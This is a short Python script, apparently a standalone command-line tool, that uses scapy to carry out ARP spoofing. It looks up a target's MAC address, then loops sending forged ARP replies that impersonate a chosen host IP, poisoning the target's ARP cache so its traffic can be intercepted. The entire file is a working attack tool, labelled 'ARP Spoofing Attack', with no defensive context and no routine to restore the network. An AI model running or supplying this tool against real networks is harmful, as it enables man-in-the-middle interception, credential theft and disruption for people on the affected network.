import scapy.all as scapy
import time
import argparse
import threading

def get_mac(ip, interface):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, iface=interface)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip, host_ip, interface):
    target_mac = get_mac(target_ip, interface)
    arp_response = scapy.ARP(op=2, psrc=host_ip, pdst=target_ip, hwdst=target_mac)
    scapy.send(arp_response, verbose=False, iface=interface)

def arp_spoofing(target_ip, host_ip, interface, interval=2):
    try:
        while True:
            spoof(target_ip, host_ip, interface)
            time.sleep(interval)
    except KeyboardInterrupt:
        print("ARP Spoofing stopped.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP Spoofing Attack")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("host_ip", help="Host IP address to impersonate")
    parser.add_argument("interface", help="Network interface to use")
    parser.add_argument("--interval", type=int, default=2, help="Interval between ARP spoofing packets in seconds")
    args = parser.parse_args()

    arp_spoofing(args.target_ip, args.host_ip, args.interface, args.interval)